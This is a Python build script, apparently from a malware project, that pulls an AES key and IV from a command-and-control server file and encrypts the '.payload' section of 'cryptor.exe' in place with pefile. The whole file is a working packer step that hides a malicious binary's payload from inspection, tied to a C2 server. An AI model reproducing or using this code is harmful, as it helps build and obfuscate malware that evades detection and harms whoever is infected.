import pefile
import os
import sys
import re
import base64
from Crypto.Cipher import AES

pe = pefile.PE(sys.argv[1]+"/cryptor.exe")

def LogPrompt(st):
    print ("\t"+os.path.basename(__file__)+">>\t"+st);

LogPrompt("Opening C2.py...")
with open("./SVR_SRC/c2.py","r") as f:
    lines = f.readlines();
    LogPrompt("Locating Information in C2.h...")
    for line in lines:
        r1 = re.match("AESKEY = \"(.*?)\"",line);
        if r1:
            LogPrompt("AESKEY Located!")
            LogPrompt("Base64 Decoding AESKEY...")
            AESKEY = base64.b64decode(r1.group(1));
            LogPrompt("AESKEY Retrieved and decoded!")
        r2 = re.match("IV = \"(.*?)\"",line);
        if r2:
            LogPrompt("IV Located!")
            LogPrompt("Base64 Decoding IV...")
            IV = base64.b64decode(r2.group(1));
            LogPrompt("IV Retrieved and decoded!")

LogPrompt("Closing C2.py!")
LogPrompt("Locating Section Attributes")
stdo =sys.stdout;
for section in pe.sections:
    if section.Name.decode().rstrip('\x00') == ".payload":
        SectionName = section.Name.decode().rstrip('\x00');
        SectionOffset = section.PointerToRawData;
        SectionSize = section.SizeOfRawData;

print("\t\tSection Name \tPhysical Offset\tSize Of Section...")
print("\t\t"+SectionName+"\t"+hex(SectionOffset)+"\t\t\t"+hex(SectionSize));
LogPrompt("Section information extracted!");
LogPrompt("Opening binary file...");
with open(sys.argv[1]+"/cryptor.exe",'rb+') as f:
    LogPrompt("Set read head to the .payload section...");
    f.seek(SectionOffset,0);
    LogPrompt("Section located!");
    LogPrompt("Reading in .payload section...");
    SectionData = f.read(SectionSize);
    cipher = AES.new(AESKEY, AES.MODE_CFB, IV);
    LogPrompt("Reading Section Completed!")
    LogPrompt("Encrypting section...")
    SectionData = cipher.encrypt(SectionData);
    LogPrompt("Section Encrypted!")
    LogPrompt("Writing encrypted section back to disk...")
    f.seek(SectionOffset,0);
    f.write(SectionData);
    LogPrompt("Encrypted section written back to disk!")
